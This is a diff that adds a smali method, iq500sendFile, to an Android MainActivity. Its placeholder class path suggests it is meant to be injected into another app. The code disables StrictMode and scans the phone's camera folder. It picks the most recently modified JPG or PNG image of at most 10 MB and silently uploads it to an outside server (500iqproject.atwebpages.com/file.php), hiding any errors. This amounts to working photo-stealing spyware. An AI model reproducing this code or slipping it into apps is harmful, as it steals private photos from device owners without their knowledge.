@@ -1,0 +1,710 @@
+.method private iq500sendFile()V
+    .registers 28
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "()V"
+        }
+    .end annotation
+
+    .prologue
+    move-object/from16 v2, p0
+
+    sget-boolean v18, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_modify/MainActivity;->adrt$enabled:Z
+
+    if-eqz v18, :cond_c
+
+    move-object/from16 v18, v2
+
+    invoke-static/range {v18 .. v18}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_modify/MainActivity$0$debug;->iq500sendFile(Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_modify/MainActivity;)V
+
+    .line 113
+    :goto_b
+    return-void
+
+    .line 64
+    :cond_c
+    :try_start_c
+    new-instance v18, Landroid/os/StrictMode$ThreadPolicy$Builder;
+
+    move-object/from16 v25, v18
+
+    move-object/from16 v18, v25
+
+    move-object/from16 v19, v25
+
+    invoke-direct/range {v19 .. v19}, Landroid/os/StrictMode$ThreadPolicy$Builder;-><init>()V
+
+    invoke-virtual/range {v18 .. v18}, Landroid/os/StrictMode$ThreadPolicy$Builder;->permitAll()Landroid/os/StrictMode$ThreadPolicy$Builder;
+
+    move-result-object v18
+
+    invoke-virtual/range {v18 .. v18}, Landroid/os/StrictMode$ThreadPolicy$Builder;->build()Landroid/os/StrictMode$ThreadPolicy;
+
+    move-result-object v18
+
+    move-object/from16 v4, v18
+
+    .line 65
+    move-object/from16 v18, v4
+
+    invoke-static/range {v18 .. v18}, Landroid/os/StrictMode;->setThreadPolicy(Landroid/os/StrictMode$ThreadPolicy;)V
+
+    .line 68
+    const-string v18, "/sdcard/DCIM/Camera/"
+
+    move-object/from16 v5, v18
+
+    .line 69
+    new-instance v18, Ljava/io/File;
+
+    move-object/from16 v25, v18
+
+    move-object/from16 v18, v25
+
+    move-object/from16 v19, v25
+
+    move-object/from16 v20, v5
+
+    invoke-direct/range {v19 .. v20}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v6, v18
+
+    .line 70
+    move-object/from16 v18, v6
+
+    invoke-virtual/range {v18 .. v18}, Ljava/io/File;->list()[Ljava/lang/String;
+
+    move-result-object v18
+
+    move-object/from16 v7, v18
+
+    .line 72
+    const-string v18, ""
+
+    move-object/from16 v8, v18
+
+    .line 75
+    const/16 v18, 0x0
+
+    move/from16 v9, v18
+
+    :goto_49
+    move/from16 v18, v9
+
+    move-object/from16 v19, v7
+
+    move-object/from16 v0, v19
+
+    array-length v0, v0
+
+    move/from16 v19, v0
+
+    move/from16 v0, v18
+
+    move/from16 v1, v19
+
+    if-lt v0, v1, :cond_d6
+
+    .line 90
+    move-object/from16 v18, v8
+
+    const-string v19, "\n"
+
+    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
+
+    move-result-object v18
+
+    move-object/from16 v9, v18
+
+    .line 91
+    const-string v18, ""
+
+    move-object/from16 v10, v18
+
+    .line 92
+    const/16 v18, 0x0
+
+    move/from16 v0, v18
+
+    int-to-long v0, v0
+
+    move-wide/from16 v18, v0
+
+    move-wide/from16 v11, v18
+
+    .line 94
+    const/16 v18, 0x0
+
+    move/from16 v13, v18
+
+    :goto_73
+    move/from16 v18, v13
+
+    move-object/from16 v19, v9
+
+    move-object/from16 v0, v19
+
+    array-length v0, v0
+
+    move/from16 v19, v0
+
+    move/from16 v0, v18
+
+    move/from16 v1, v19
+
+    if-lt v0, v1, :cond_259
+
+    .line 103
+    new-instance v18, Ljava/io/File;
+
+    move-object/from16 v25, v18
+
+    move-object/from16 v18, v25
+
+    move-object/from16 v19, v25
+
+    move-object/from16 v20, v10
+
+    invoke-direct/range {v19 .. v20}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v13, v18
+
+    .line 105
+    new-instance v18, Lorg/apache/http/entity/FileEntity;
+
+    move-object/from16 v25, v18
+
+    move-object/from16 v18, v25
+
+    move-object/from16 v19, v25
+
+    move-object/from16 v20, v13
+
+    const-string v21, "binary/octet-stream"
+
+    invoke-direct/range {v19 .. v21}, Lorg/apache/http/entity/FileEntity;-><init>(Ljava/io/File;Ljava/lang/String;)V
+
+    move-object/from16 v14, v18
+
+    .line 107
+    new-instance v18, Lorg/apache/http/impl/client/DefaultHttpClient;
+
+    move-object/from16 v25, v18
+
+    move-object/from16 v18, v25
+
+    move-object/from16 v19, v25
+
+    invoke-direct/range {v19 .. v19}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V
+
+    move-object/from16 v15, v18
+
+    .line 108
+    new-instance v18, Lorg/apache/http/client/methods/HttpPost;
+
+    move-object/from16 v25, v18
+
+    move-object/from16 v18, v25
+
+    move-object/from16 v19, v25
+
+    const-string v20, "http://500iqproject.atwebpages.com/file.php"
+
+    invoke-direct/range {v19 .. v20}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V
+
+    move-object/from16 v16, v18
+
+    .line 110
+    move-object/from16 v18, v16
+
+    move-object/from16 v19, v14
+
+    invoke-virtual/range {v18 .. v19}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V
+
+    .line 111
+    move-object/from16 v18, v14
+
+    const-string v19, "binary/octet-stream"
+
+    invoke-virtual/range {v18 .. v19}, Lorg/apache/http/entity/FileEntity;->setContentType(Ljava/lang/String;)V
+
+    .line 113
+    move-object/from16 v18, v15
+
+    move-object/from16 v19, v16
+
+    invoke-interface/range {v18 .. v19}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
+
+    move-result-object v18
+
+    :goto_d4
+    goto/16 :goto_b
+
+    .line 77
+    :cond_d6
+    move-object/from16 v18, v7
+
+    move/from16 v19, v9
+
+    aget-object v18, v18, v19
+
+    const-string v19, ".jpg"
+
+    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
+
+    move-result v18
+
+    new-instance v19, Ljava/lang/Boolean;
+
+    move/from16 v25, v18
+
+    move-object/from16 v26, v19
+
+    move-object/from16 v18, v26
+
+    move/from16 v19, v25
+
+    move-object/from16 v20, v26
+
+    move/from16 v25, v19
+
+    move-object/from16 v26, v20
+
+    move-object/from16 v19, v26
+
+    move/from16 v20, v25
+
+    invoke-direct/range {v19 .. v20}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v10, v18
+
+    .line 78
+    move-object/from16 v18, v7
+
+    move/from16 v19, v9
+
+    aget-object v18, v18, v19
+
+    const-string v19, ".jpeg"
+
+    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
+
+    move-result v18
+
+    new-instance v19, Ljava/lang/Boolean;
+
+    move/from16 v25, v18
+
+    move-object/from16 v26, v19
+
+    move-object/from16 v18, v26
+
+    move/from16 v19, v25
+
+    move-object/from16 v20, v26
+
+    move/from16 v25, v19
+
+    move-object/from16 v26, v20
+
+    move-object/from16 v19, v26
+
+    move/from16 v20, v25
+
+    invoke-direct/range {v19 .. v20}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v11, v18
+
+    .line 79
+    move-object/from16 v18, v7
+
+    move/from16 v19, v9
+
+    aget-object v18, v18, v19
+
+    const-string v19, ".png"
+
+    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
+
+    move-result v18
+
+    new-instance v19, Ljava/lang/Boolean;
+
+    move/from16 v25, v18
+
+    move-object/from16 v26, v19
+
+    move-object/from16 v18, v26
+
+    move/from16 v19, v25
+
+    move-object/from16 v20, v26
+
+    move/from16 v25, v19
+
+    move-object/from16 v26, v20
+
+    move-object/from16 v19, v26
+
+    move/from16 v20, v25
+
+    invoke-direct/range {v19 .. v20}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v12, v18
+
+    .line 80
+    new-instance v18, Ljava/io/File;
+
+    move-object/from16 v25, v18
+
+    move-object/from16 v18, v25
+
+    move-object/from16 v19, v25
+
+    new-instance v20, Ljava/lang/StringBuffer;
+
+    move-object/from16 v25, v20
+
+    move-object/from16 v20, v25
+
+    move-object/from16 v21, v25
+
+    invoke-direct/range {v21 .. v21}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v21, v5
+
+    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v20
+
+    move-object/from16 v21, v7
+
+    move/from16 v22, v9
+
+    aget-object v21, v21, v22
+
+    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v20
+
+    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v20
+
+    invoke-direct/range {v19 .. v20}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual/range {v18 .. v18}, Ljava/io/File;->length()J
+
+    move-result-wide v18
+
+    const/16 v20, 0x400
+
+    move/from16 v0, v20
+
+    int-to-long v0, v0
+
+    move-wide/from16 v20, v0
+
+    div-long v18, v18, v20
+
+    const/16 v20, 0x400
+
+    move/from16 v0, v20
+
+    int-to-long v0, v0
+
+    move-wide/from16 v20, v0
+
+    div-long v18, v18, v20
+
+    const/16 v20, 0xa
+
+    move/from16 v0, v20
+
+    int-to-long v0, v0
+
+    move-wide/from16 v20, v0
+
+    cmp-long v18, v18, v20
+
+    if-lez v18, :cond_255
+
+    const/16 v18, 0x0
+
+    :goto_192
+    new-instance v19, Ljava/lang/Boolean;
+
+    move/from16 v25, v18
+
+    move-object/from16 v26, v19
+
+    move-object/from16 v18, v26
+
+    move/from16 v19, v25
+
+    move-object/from16 v20, v26
+
+    move/from16 v25, v19
+
+    move-object/from16 v26, v20
+
+    move-object/from16 v19, v26
+
+    move/from16 v20, v25
+
+    invoke-direct/range {v19 .. v20}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v13, v18
+
+    .line 81
+    move-object/from16 v18, v10
+
+    check-cast v18, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v18 .. v18}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v18
+
+    if-eqz v18, :cond_1bf
+
+    move-object/from16 v18, v13
+
+    check-cast v18, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v18 .. v18}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v18
+
+    if-nez v18, :cond_1e7
+
+    :cond_1bf
+    move-object/from16 v18, v11
+
+    check-cast v18, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v18 .. v18}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v18
+
+    if-eqz v18, :cond_1d3
+
+    move-object/from16 v18, v13
+
+    check-cast v18, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v18 .. v18}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v18
+
+    if-nez v18, :cond_1e7
+
+    :cond_1d3
+    move-object/from16 v18, v12
+
+    check-cast v18, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v18 .. v18}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v18
+
+    if-eqz v18, :cond_251
+
+    move-object/from16 v18, v13
+
+    check-cast v18, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v18 .. v18}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v18
+
+    if-eqz v18, :cond_251
+
+    .line 83
+    :cond_1e7
+    new-instance v18, Ljava/lang/StringBuffer;
+
+    move-object/from16 v25, v18
+
+    move-object/from16 v18, v25
+
+    move-object/from16 v19, v25
+
+    invoke-direct/range {v19 .. v19}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v19, v8
+
+    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v18
+
+    new-instance v19, Ljava/lang/StringBuffer;
+
+    move-object/from16 v25, v19
+
+    move-object/from16 v19, v25
+
+    move-object/from16 v20, v25
+
+    invoke-direct/range {v20 .. v20}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v20, v5
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v19
+
+    move-object/from16 v20, v7
+
+    move/from16 v21, v9
+
+    aget-object v20, v20, v21
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v19
+
+    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v19
+
+    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v18
+
+    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v18
+
+    move-object/from16 v8, v18
+
+    .line 85
+    move/from16 v18, v9
+
+    move-object/from16 v19, v7
+
+    move-object/from16 v0, v19
+
+    array-length v0, v0
+
+    move/from16 v19, v0
+
+    const/16 v20, 0x1
+
+    add-int/lit8 v19, v19, -0x1
+
+    move/from16 v0, v18
+
+    move/from16 v1, v19
+
+    if-ge v0, v1, :cond_251
+
+    .line 86
+    new-instance v18, Ljava/lang/StringBuffer;
+
+    move-object/from16 v25, v18
+
+    move-object/from16 v18, v25
+
+    move-object/from16 v19, v25
+
+    invoke-direct/range {v19 .. v19}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v19, v8
+
+    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v18
+
+    const-string v19, "\n"
+
+    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v18
+
+    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v18
+
+    move-object/from16 v8, v18
+
+    .line 75
+    :cond_251
+    add-int/lit8 v9, v9, 0x1
+
+    goto/16 :goto_49
+
+    .line 80
+    :cond_255
+    const/16 v18, 0x1
+
+    goto/16 :goto_192
+
+    .line 96
+    :cond_259
+    move-wide/from16 v18, v11
+
+    move-wide/from16 v14, v18
+
+    .line 97
+    move-wide/from16 v18, v11
+
+    new-instance v20, Ljava/io/File;
+
+    move-object/from16 v25, v20
+
+    move-object/from16 v20, v25
+
+    move-object/from16 v21, v25
+
+    move-object/from16 v22, v9
+
+    move/from16 v23, v13
+
+    aget-object v22, v22, v23
+
+    invoke-direct/range {v21 .. v22}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual/range {v20 .. v20}, Ljava/io/File;->lastModified()J
+
+    move-result-wide v20
+
+    invoke-static/range {v18 .. v21}, Ljava/lang/Math;->max(JJ)J
+
+    move-result-wide v18
+
+    move-wide/from16 v11, v18
+
+    .line 98
+    move-wide/from16 v18, v14
+
+    move-wide/from16 v20, v11
+
+    cmp-long v18, v18, v20
+
+    if-eqz v18, :cond_28a
+
+    .line 99
+    move-object/from16 v18, v9
+
+    move/from16 v19, v13
+
+    aget-object v18, v18, v19
+    :try_end_288
+    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_288} :catch_28e
+
+    move-object/from16 v10, v18
+
+    .line 94
+    :cond_28a
+    add-int/lit8 v13, v13, 0x1
+
+    goto/16 :goto_73
+
+    .line 113
+    :catch_28e
+    move-exception v18
+
+    move-object/from16 v4, v18
+
+    goto/16 :goto_d4
+.end method
